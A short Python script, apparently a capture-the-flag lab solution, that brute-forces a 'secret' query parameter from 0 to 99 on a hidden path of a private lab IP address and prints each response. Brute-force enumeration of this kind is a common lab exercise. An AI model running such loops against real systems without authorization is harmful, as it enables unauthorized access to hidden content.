#!/usr/bin/env python3

import requests

for i in range(0,100):
	url = f"http://10.10.117.91/th1s_1s_h1dd3n/?secret={i}"
	response = requests.get(url)
	print(response.text)
	
